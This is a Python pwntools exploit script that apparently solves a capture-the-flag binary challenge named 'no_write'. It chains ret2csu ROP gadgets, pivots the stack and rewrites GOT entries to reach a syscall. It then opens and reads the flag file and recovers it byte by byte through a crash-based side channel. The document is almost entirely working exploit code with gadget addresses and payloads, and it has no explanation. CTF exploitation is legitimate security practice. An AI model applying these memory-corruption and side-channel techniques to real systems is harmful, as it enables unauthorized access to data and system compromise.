from pwn import *
import string
context.arch='amd64'

def ret_csu(func,arg1=0,arg2=0,arg3=0):
    payload = ''
    payload += p64(0)+p64(1)+p64(func)
    payload += p64(arg1)+p64(arg2)+p64(arg3)+p64(0x000000000400750)+p64(0)
    return payload
def main(host,port=2333):
    # global p
    # if host:
        # p = remote(host,port)
    # else:
        # p = process("./no_write")
        # gdb.attach(p,"b* 0x0000000004006E6")
    # 0x0000000000400773 : pop rdi ; ret
    # 0x0000000000400771 : pop rsi ; pop r15 ; ret
    # .text:0000000000400544                 call    cs:__libc_start_main_ptr

    # .text:00000000004005E8                 add     [rbp-3Dh], ebx
    # .text:00000000004005EB                 nop     dword ptr [rax+rax+00h]
    # .text:00000000004005F0                 rep retn
    charset = '}{_'+string.digits+string.letters
    flag = ''
    for i in range(0x30):
        for j in charset:
            try:
                #p = remote(host,6000)
                p = process('./no_write')
                pppppp_ret = 0x00000000040076A
                read_got = 0x000000000600FD8
                call_libc_start_main = 0x000000000400544
                p_rdi = 0x0000000000400773
                p_rsi_r15 = 0x0000000000400771
                # 03:0018|  0x601318 -> 0x7f6352629d80 (initial) <-0x0
                offset = 0x267870 #initial - __strncmp_sse42
                readn = 0x0000000004006BF
                leave_tet = 0x00000000040070B
                payload = "A"*0x18+p64(pppppp_ret)+ret_csu(read_got,0,0x601350,0x400)
                payload += p64(0)+p64(0x6013f8)+p64(0)*4+p64(leave_tet)
                payload = payload.ljust(0x100,'\x00')
                p.send(payload)
                sleep(0.3)
                payload = "\x00"*(0x100-0x50)
                payload += p64(p_rdi)+p64(readn)+p64(call_libc_start_main)
                payload = payload.ljust(0x400,'\x00')
                p.send(payload)
                sleep(0.3)
                # 0x601318
                payload = p64(pppppp_ret)+p64((0x100000000-offset)&0xffffffff)
                payload += p64(0x601318+0x3D)+p64(0)*4+p64(0x4005E8)
                # 0x00000000000d2975: syscall; ret;
                # 02:0010|            0x601310 -> 0x7f61d00d8628 (__exit_funcs_lock) <- 0x0
                offset = 0x31dcb3 # __exit_funcs_lock - syscall
                payload += p64(pppppp_ret)+p64((0x100000000-offset)&0xffffffff)
                payload += p64(0x601310+0x3D)+p64(0)*4+p64(0x4005E8)
                payload += p64(pppppp_ret)+ret_csu(read_got,0,0x601800,2)
                payload += p64(0)*6
                payload += p64(pppppp_ret)+ret_csu(0x601310,0x601350+0x3f8,0,0) #open flag
                payload += p64(0)*6
                payload += p64(pppppp_ret)+ret_csu(read_got,3,0x601800,0x100)   #read flag
                payload += p64(0)*6
                payload += p64(pppppp_ret)+ret_csu(read_got,0,0x601ff8,8)
                # now we can cmp the flag one_by_one
                payload += p64(0)*6 
                payload += p64(pppppp_ret)+ret_csu(0x601318,0x601800+i,0x601fff,2)
                payload += p64(0)*6
                for _ in range(4):
                    payload += p64(p_rdi)+p64(0x601700)+p64(p_rsi_r15)+p64(0x100)+p64(0)+p64(readn)

                payload = payload.ljust(0x3f8,'\x00')
                payload += "flag\x00\x00\x00\x00"
                p.send(payload)
                sleep(0.3)
                p.send("dd"+"d"*7+j)
                sleep(0.5)
                p.recv(timeout=0.5)
                p.send("A"*0x100)
                # info(j)
                p.close()
                # p.interactive()
            except EOFError:
                flag += j
                info(flag)
                if(j == '}'):
                    exit()
                p.close()
                # pause()
                break
if __name__ == "__main__":
    # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
    main(args["REMOTE"])

